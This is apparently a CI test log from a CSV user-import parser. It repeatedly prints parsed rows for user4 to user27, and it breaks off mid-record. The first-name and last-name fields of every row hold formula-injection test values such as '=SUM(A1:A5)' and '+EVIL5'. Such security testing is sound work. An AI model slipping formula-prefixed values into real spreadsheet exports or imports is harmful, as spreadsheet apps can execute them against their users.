2025-11-18T17:35:41.6175116Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6175393Z   email: [32m'user4@example.com'[39m,
2025-11-18T17:35:41.6175674Z   firstName: [32m'=SUM(A1:A4)'[39m,
2025-11-18T17:35:41.6175914Z   lastName: [32m'+EVIL4'[39m,
2025-11-18T17:35:41.6176117Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6176364Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6176482Z }
2025-11-18T17:35:41.6176669Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6177055Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6177823Z   cellValues: [ [32m'user5@example.com'[39m, [32m'=SUM(A1:A5)'[39m, [32m'+EVIL5'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6177985Z   columnMapping: {
2025-11-18T17:35:41.6178208Z     email: [33m0[39m,
2025-11-18T17:35:41.6178410Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6178608Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6178814Z     role: [33m3[39m,
2025-11-18T17:35:41.6178985Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6179189Z     password: [33m-1[39m
2025-11-18T17:35:41.6179308Z   }
2025-11-18T17:35:41.6179434Z }
2025-11-18T17:35:41.6179670Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6180203Z   email: [32m'user5@example.com'[39m,
2025-11-18T17:35:41.6180496Z   firstName: [32m'=SUM(A1:A5)'[39m,
2025-11-18T17:35:41.6180755Z   lastName: [32m'+EVIL5'[39m,
2025-11-18T17:35:41.6180982Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6181240Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6181367Z }
2025-11-18T17:35:41.6181556Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6181782Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6182548Z   cellValues: [ [32m'user6@example.com'[39m, [32m'=SUM(A1:A6)'[39m, [32m'+EVIL6'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6182705Z   columnMapping: {
2025-11-18T17:35:41.6182918Z     email: [33m0[39m,
2025-11-18T17:35:41.6183116Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6183315Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6183497Z     role: [33m3[39m,
2025-11-18T17:35:41.6183683Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6183894Z     password: [33m-1[39m
2025-11-18T17:35:41.6184025Z   }
2025-11-18T17:35:41.6184146Z }
2025-11-18T17:35:41.6184379Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6184675Z   email: [32m'user6@example.com'[39m,
2025-11-18T17:35:41.6184938Z   firstName: [32m'=SUM(A1:A6)'[39m,
2025-11-18T17:35:41.6185178Z   lastName: [32m'+EVIL6'[39m,
2025-11-18T17:35:41.6185389Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6185630Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6185984Z }
2025-11-18T17:35:41.6186191Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6186439Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6187340Z   cellValues: [ [32m'user7@example.com'[39m, [32m'=SUM(A1:A7)'[39m, [32m'+EVIL7'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6187495Z   columnMapping: {
2025-11-18T17:35:41.6187696Z     email: [33m0[39m,
2025-11-18T17:35:41.6187884Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6188070Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6188240Z     role: [33m3[39m,
2025-11-18T17:35:41.6188424Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6188646Z     password: [33m-1[39m
2025-11-18T17:35:41.6188772Z   }
2025-11-18T17:35:41.6188904Z }
2025-11-18T17:35:41.6189149Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6189474Z   email: [32m'user7@example.com'[39m,
2025-11-18T17:35:41.6189754Z   firstName: [32m'=SUM(A1:A7)'[39m,
2025-11-18T17:35:41.6190004Z   lastName: [32m'+EVIL7'[39m,
2025-11-18T17:35:41.6190223Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6190500Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6190639Z }
2025-11-18T17:35:41.6190828Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6191059Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6191794Z   cellValues: [ [32m'user8@example.com'[39m, [32m'=SUM(A1:A8)'[39m, [32m'+EVIL8'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6191946Z   columnMapping: {
2025-11-18T17:35:41.6192145Z     email: [33m0[39m,
2025-11-18T17:35:41.6192370Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6192577Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6192776Z     role: [33m3[39m,
2025-11-18T17:35:41.6192963Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6193170Z     password: [33m-1[39m
2025-11-18T17:35:41.6193293Z   }
2025-11-18T17:35:41.6193410Z }
2025-11-18T17:35:41.6193660Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6193966Z   email: [32m'user8@example.com'[39m,
2025-11-18T17:35:41.6194249Z   firstName: [32m'=SUM(A1:A8)'[39m,
2025-11-18T17:35:41.6194509Z   lastName: [32m'+EVIL8'[39m,
2025-11-18T17:35:41.6194723Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6194975Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6195090Z }
2025-11-18T17:35:41.6195275Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6195480Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6196239Z   cellValues: [ [32m'user9@example.com'[39m, [32m'=SUM(A1:A9)'[39m, [32m'+EVIL9'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6196419Z   columnMapping: {
2025-11-18T17:35:41.6196647Z     email: [33m0[39m,
2025-11-18T17:35:41.6197068Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6197570Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6197768Z     role: [33m3[39m,
2025-11-18T17:35:41.6197952Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6198159Z     password: [33m-1[39m
2025-11-18T17:35:41.6198284Z   }
2025-11-18T17:35:41.6198400Z }
2025-11-18T17:35:41.6198639Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6198922Z   email: [32m'user9@example.com'[39m,
2025-11-18T17:35:41.6199204Z   firstName: [32m'=SUM(A1:A9)'[39m,
2025-11-18T17:35:41.6199444Z   lastName: [32m'+EVIL9'[39m,
2025-11-18T17:35:41.6199642Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6199890Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6200007Z }
2025-11-18T17:35:41.6200196Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6200401Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6201155Z   cellValues: [ [32m'user10@example.com'[39m, [32m'=SUM(A1:A10)'[39m, [32m'+EVIL10'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6201304Z   columnMapping: {
2025-11-18T17:35:41.6201525Z     email: [33m0[39m,
2025-11-18T17:35:41.6201742Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6201947Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6202157Z     role: [33m3[39m,
2025-11-18T17:35:41.6202352Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6202567Z     password: [33m-1[39m
2025-11-18T17:35:41.6202686Z   }
2025-11-18T17:35:41.6202805Z }
2025-11-18T17:35:41.6203045Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6203608Z   email: [32m'user10@example.com'[39m,
2025-11-18T17:35:41.6203953Z   firstName: [32m'=SUM(A1:A10)'[39m,
2025-11-18T17:35:41.6204218Z   lastName: [32m'+EVIL10'[39m,
2025-11-18T17:35:41.6204446Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6204703Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6204835Z }
2025-11-18T17:35:41.6205032Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6205246Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6206012Z   cellValues: [ [32m'user11@example.com'[39m, [32m'=SUM(A1:A11)'[39m, [32m'+EVIL11'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6206185Z   columnMapping: {
2025-11-18T17:35:41.6206408Z     email: [33m0[39m,
2025-11-18T17:35:41.6206606Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6207054Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6207267Z     role: [33m3[39m,
2025-11-18T17:35:41.6207460Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6207676Z     password: [33m-1[39m
2025-11-18T17:35:41.6207804Z   }
2025-11-18T17:35:41.6207945Z }
2025-11-18T17:35:41.6208191Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6208506Z   email: [32m'user11@example.com'[39m,
2025-11-18T17:35:41.6208772Z   firstName: [32m'=SUM(A1:A11)'[39m,
2025-11-18T17:35:41.6209012Z   lastName: [32m'+EVIL11'[39m,
2025-11-18T17:35:41.6209218Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6209462Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6209581Z }
2025-11-18T17:35:41.6209762Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6209969Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6210698Z   cellValues: [ [32m'user12@example.com'[39m, [32m'=SUM(A1:A12)'[39m, [32m'+EVIL12'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6210849Z   columnMapping: {
2025-11-18T17:35:41.6211044Z     email: [33m0[39m,
2025-11-18T17:35:41.6211242Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6211441Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6211621Z     role: [33m3[39m,
2025-11-18T17:35:41.6211813Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6212035Z     password: [33m-1[39m
2025-11-18T17:35:41.6212152Z   }
2025-11-18T17:35:41.6212276Z }
2025-11-18T17:35:41.6212507Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6212802Z   email: [32m'user12@example.com'[39m,
2025-11-18T17:35:41.6213072Z   firstName: [32m'=SUM(A1:A12)'[39m,
2025-11-18T17:35:41.6213337Z   lastName: [32m'+EVIL12'[39m,
2025-11-18T17:35:41.6213541Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6213807Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6213940Z }
2025-11-18T17:35:41.6214130Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6214619Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6215396Z   cellValues: [ [32m'user13@example.com'[39m, [32m'=SUM(A1:A13)'[39m, [32m'+EVIL13'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6215558Z   columnMapping: {
2025-11-18T17:35:41.6215772Z     email: [33m0[39m,
2025-11-18T17:35:41.6216088Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6216312Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6216530Z     role: [33m3[39m,
2025-11-18T17:35:41.6216741Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6217166Z     password: [33m-1[39m
2025-11-18T17:35:41.6217298Z   }
2025-11-18T17:35:41.6217419Z }
2025-11-18T17:35:41.6217666Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6217988Z   email: [32m'user13@example.com'[39m,
2025-11-18T17:35:41.6218261Z   firstName: [32m'=SUM(A1:A13)'[39m,
2025-11-18T17:35:41.6218511Z   lastName: [32m'+EVIL13'[39m,
2025-11-18T17:35:41.6218729Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6219001Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6219136Z }
2025-11-18T17:35:41.6219335Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6219558Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6220307Z   cellValues: [ [32m'user14@example.com'[39m, [32m'=SUM(A1:A14)'[39m, [32m'+EVIL14'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6220465Z   columnMapping: {
2025-11-18T17:35:41.6220670Z     email: [33m0[39m,
2025-11-18T17:35:41.6220873Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6221267Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6221467Z     role: [33m3[39m,
2025-11-18T17:35:41.6221661Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6221876Z     password: [33m-1[39m
2025-11-18T17:35:41.6222009Z   }
2025-11-18T17:35:41.6222132Z }
2025-11-18T17:35:41.6222388Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6222710Z   email: [32m'user14@example.com'[39m,
2025-11-18T17:35:41.6222988Z   firstName: [32m'=SUM(A1:A14)'[39m,
2025-11-18T17:35:41.6223242Z   lastName: [32m'+EVIL14'[39m,
2025-11-18T17:35:41.6223452Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6223718Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6223835Z }
2025-11-18T17:35:41.6224033Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6224258Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6225024Z   cellValues: [ [32m'user15@example.com'[39m, [32m'=SUM(A1:A15)'[39m, [32m'+EVIL15'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6225173Z   columnMapping: {
2025-11-18T17:35:41.6225388Z     email: [33m0[39m,
2025-11-18T17:35:41.6225622Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6225834Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6226044Z     role: [33m3[39m,
2025-11-18T17:35:41.6226245Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6226475Z     password: [33m-1[39m
2025-11-18T17:35:41.6226601Z   }
2025-11-18T17:35:41.6226721Z }
2025-11-18T17:35:41.6227392Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6227733Z   email: [32m'user15@example.com'[39m,
2025-11-18T17:35:41.6228024Z   firstName: [32m'=SUM(A1:A15)'[39m,
2025-11-18T17:35:41.6228305Z   lastName: [32m'+EVIL15'[39m,
2025-11-18T17:35:41.6228531Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6228793Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6228915Z }
2025-11-18T17:35:41.6229125Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6229353Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6230129Z   cellValues: [ [32m'user16@example.com'[39m, [32m'=SUM(A1:A16)'[39m, [32m'+EVIL16'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6230292Z   columnMapping: {
2025-11-18T17:35:41.6230505Z     email: [33m0[39m,
2025-11-18T17:35:41.6230712Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6230923Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6231108Z     role: [33m3[39m,
2025-11-18T17:35:41.6231292Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6231503Z     password: [33m-1[39m
2025-11-18T17:35:41.6231629Z   }
2025-11-18T17:35:41.6231756Z }
2025-11-18T17:35:41.6232001Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6232315Z   email: [32m'user16@example.com'[39m,
2025-11-18T17:35:41.6232814Z   firstName: [32m'=SUM(A1:A16)'[39m,
2025-11-18T17:35:41.6233061Z   lastName: [32m'+EVIL16'[39m,
2025-11-18T17:35:41.6233269Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6233527Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6233657Z }
2025-11-18T17:35:41.6233854Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6234092Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6234884Z   cellValues: [ [32m'user17@example.com'[39m, [32m'=SUM(A1:A17)'[39m, [32m'+EVIL17'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6235045Z   columnMapping: {
2025-11-18T17:35:41.6235270Z     email: [33m0[39m,
2025-11-18T17:35:41.6235473Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6235677Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6235866Z     role: [33m3[39m,
2025-11-18T17:35:41.6236059Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6236267Z     password: [33m-1[39m
2025-11-18T17:35:41.6236381Z   }
2025-11-18T17:35:41.6236508Z }
2025-11-18T17:35:41.6236742Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6237271Z   email: [32m'user17@example.com'[39m,
2025-11-18T17:35:41.6237544Z   firstName: [32m'=SUM(A1:A17)'[39m,
2025-11-18T17:35:41.6237812Z   lastName: [32m'+EVIL17'[39m,
2025-11-18T17:35:41.6238028Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6238294Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6238421Z }
2025-11-18T17:35:41.6238619Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6239076Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6239883Z   cellValues: [ [32m'user18@example.com'[39m, [32m'=SUM(A1:A18)'[39m, [32m'+EVIL18'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6240056Z   columnMapping: {
2025-11-18T17:35:41.6240403Z     email: [33m0[39m,
2025-11-18T17:35:41.6240632Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6240842Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6241040Z     role: [33m3[39m,
2025-11-18T17:35:41.6241246Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6241459Z     password: [33m-1[39m
2025-11-18T17:35:41.6241591Z   }
2025-11-18T17:35:41.6241729Z }
2025-11-18T17:35:41.6241974Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6242299Z   email: [32m'user18@example.com'[39m,
2025-11-18T17:35:41.6242589Z   firstName: [32m'=SUM(A1:A18)'[39m,
2025-11-18T17:35:41.6242864Z   lastName: [32m'+EVIL18'[39m,
2025-11-18T17:35:41.6243080Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6243342Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6243465Z }
2025-11-18T17:35:41.6243659Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6243873Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6244631Z   cellValues: [ [32m'user19@example.com'[39m, [32m'=SUM(A1:A19)'[39m, [32m'+EVIL19'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6244799Z   columnMapping: {
2025-11-18T17:35:41.6245019Z     email: [33m0[39m,
2025-11-18T17:35:41.6245242Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6245450Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6245653Z     role: [33m3[39m,
2025-11-18T17:35:41.6245851Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6246071Z     password: [33m-1[39m
2025-11-18T17:35:41.6246203Z   }
2025-11-18T17:35:41.6246319Z }
2025-11-18T17:35:41.6246561Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6247074Z   email: [32m'user19@example.com'[39m,
2025-11-18T17:35:41.6247474Z   firstName: [32m'=SUM(A1:A19)'[39m,
2025-11-18T17:35:41.6247759Z   lastName: [32m'+EVIL19'[39m,
2025-11-18T17:35:41.6247980Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6248266Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6248388Z }
2025-11-18T17:35:41.6248654Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6248879Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6249626Z   cellValues: [ [32m'user20@example.com'[39m, [32m'=SUM(A1:A20)'[39m, [32m'+EVIL20'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6249787Z   columnMapping: {
2025-11-18T17:35:41.6250010Z     email: [33m0[39m,
2025-11-18T17:35:41.6250233Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6250543Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6251091Z     role: [33m3[39m,
2025-11-18T17:35:41.6251296Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6251536Z     password: [33m-1[39m
2025-11-18T17:35:41.6251671Z   }
2025-11-18T17:35:41.6251798Z }
2025-11-18T17:35:41.6252040Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6252348Z   email: [32m'user20@example.com'[39m,
2025-11-18T17:35:41.6252651Z   firstName: [32m'=SUM(A1:A20)'[39m,
2025-11-18T17:35:41.6252919Z   lastName: [32m'+EVIL20'[39m,
2025-11-18T17:35:41.6253154Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6253427Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6253554Z }
2025-11-18T17:35:41.6253754Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6253986Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6254796Z   cellValues: [ [32m'user21@example.com'[39m, [32m'=SUM(A1:A21)'[39m, [32m'+EVIL21'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6255021Z   columnMapping: {
2025-11-18T17:35:41.6255269Z     email: [33m0[39m,
2025-11-18T17:35:41.6255530Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6255750Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6255945Z     role: [33m3[39m,
2025-11-18T17:35:41.6256141Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6256389Z     password: [33m-1[39m
2025-11-18T17:35:41.6256569Z   }
2025-11-18T17:35:41.6256699Z }
2025-11-18T17:35:41.6257213Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6257559Z   email: [32m'user21@example.com'[39m,
2025-11-18T17:35:41.6258084Z   firstName: [32m'=SUM(A1:A21)'[39m,
2025-11-18T17:35:41.6258401Z   lastName: [32m'+EVIL21'[39m,
2025-11-18T17:35:41.6258633Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6258900Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6259039Z }
2025-11-18T17:35:41.6259227Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6259463Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6260213Z   cellValues: [ [32m'user22@example.com'[39m, [32m'=SUM(A1:A22)'[39m, [32m'+EVIL22'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6260420Z   columnMapping: {
2025-11-18T17:35:41.6260658Z     email: [33m0[39m,
2025-11-18T17:35:41.6260878Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6261110Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6261314Z     role: [33m3[39m,
2025-11-18T17:35:41.6261517Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6261736Z     password: [33m-1[39m
2025-11-18T17:35:41.6261855Z   }
2025-11-18T17:35:41.6261985Z }
2025-11-18T17:35:41.6262223Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6262537Z   email: [32m'user22@example.com'[39m,
2025-11-18T17:35:41.6262816Z   firstName: [32m'=SUM(A1:A22)'[39m,
2025-11-18T17:35:41.6263078Z   lastName: [32m'+EVIL22'[39m,
2025-11-18T17:35:41.6263288Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6263539Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6263670Z }
2025-11-18T17:35:41.6263859Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6264073Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6264819Z   cellValues: [ [32m'user23@example.com'[39m, [32m'=SUM(A1:A23)'[39m, [32m'+EVIL23'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6264982Z   columnMapping: {
2025-11-18T17:35:41.6265180Z     email: [33m0[39m,
2025-11-18T17:35:41.6265385Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6265583Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6265762Z     role: [33m3[39m,
2025-11-18T17:35:41.6265951Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6266154Z     password: [33m-1[39m
2025-11-18T17:35:41.6266277Z   }
2025-11-18T17:35:41.6266400Z }
2025-11-18T17:35:41.6266633Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6267133Z   email: [32m'user23@example.com'[39m,
2025-11-18T17:35:41.6267419Z   firstName: [32m'=SUM(A1:A23)'[39m,
2025-11-18T17:35:41.6267678Z   lastName: [32m'+EVIL23'[39m,
2025-11-18T17:35:41.6267885Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6268147Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6268267Z }
2025-11-18T17:35:41.6268434Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6268632Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6269366Z   cellValues: [ [32m'user24@example.com'[39m, [32m'=SUM(A1:A24)'[39m, [32m'+EVIL24'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6269745Z   columnMapping: {
2025-11-18T17:35:41.6269954Z     email: [33m0[39m,
2025-11-18T17:35:41.6270156Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6270349Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6270546Z     role: [33m3[39m,
2025-11-18T17:35:41.6270749Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6270975Z     password: [33m-1[39m
2025-11-18T17:35:41.6271108Z   }
2025-11-18T17:35:41.6271224Z }
2025-11-18T17:35:41.6271473Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6271777Z   email: [32m'user24@example.com'[39m,
2025-11-18T17:35:41.6272061Z   firstName: [32m'=SUM(A1:A24)'[39m,
2025-11-18T17:35:41.6272322Z   lastName: [32m'+EVIL24'[39m,
2025-11-18T17:35:41.6272541Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6272835Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6272966Z }
2025-11-18T17:35:41.6273156Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6273428Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6274251Z   cellValues: [ [32m'user25@example.com'[39m, [32m'=SUM(A1:A25)'[39m, [32m'+EVIL25'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6274415Z   columnMapping: {
2025-11-18T17:35:41.6274636Z     email: [33m0[39m,
2025-11-18T17:35:41.6274869Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6275092Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6275560Z     role: [33m3[39m,
2025-11-18T17:35:41.6275817Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6276047Z     password: [33m-1[39m
2025-11-18T17:35:41.6276170Z   }
2025-11-18T17:35:41.6276291Z }
2025-11-18T17:35:41.6276544Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6277070Z   email: [32m'user25@example.com'[39m,
2025-11-18T17:35:41.6277387Z   firstName: [32m'=SUM(A1:A25)'[39m,
2025-11-18T17:35:41.6277670Z   lastName: [32m'+EVIL25'[39m,
2025-11-18T17:35:41.6277896Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6278163Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6278304Z }
2025-11-18T17:35:41.6278510Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6278742Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6279514Z   cellValues: [ [32m'user26@example.com'[39m, [32m'=SUM(A1:A26)'[39m, [32m'+EVIL26'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6279672Z   columnMapping: {
2025-11-18T17:35:41.6279905Z     email: [33m0[39m,
2025-11-18T17:35:41.6280120Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6280347Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6280547Z     role: [33m3[39m,
2025-11-18T17:35:41.6280750Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6280968Z     password: [33m-1[39m
2025-11-18T17:35:41.6281089Z   }
2025-11-18T17:35:41.6281219Z }
2025-11-18T17:35:41.6281461Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6281788Z   email: [32m'user26@example.com'[39m,
2025-11-18T17:35:41.6282078Z   firstName: [32m'=SUM(A1:A26)'[39m,
2025-11-18T17:35:41.6282343Z   lastName: [32m'+EVIL26'[39m,
2025-11-18T17:35:41.6282572Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6282845Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6282982Z }
2025-11-18T17:35:41.6283178Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6283418Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6284187Z   cellValues: [ [32m'user27@example.com'[39m, [32m'=SUM(A1:A27)'[39m, [32m'+EVIL27'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6284350Z   columnMapping: {
2025-11-18T17:35:41.6284606Z     email: [33m0[39m,
2025-11-18T17:35:41.6284819Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6285023Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6285205Z     role: [33m3[39m,
2025-11-18T17:35:41.6285399Z     rut: [33m-1[39m,
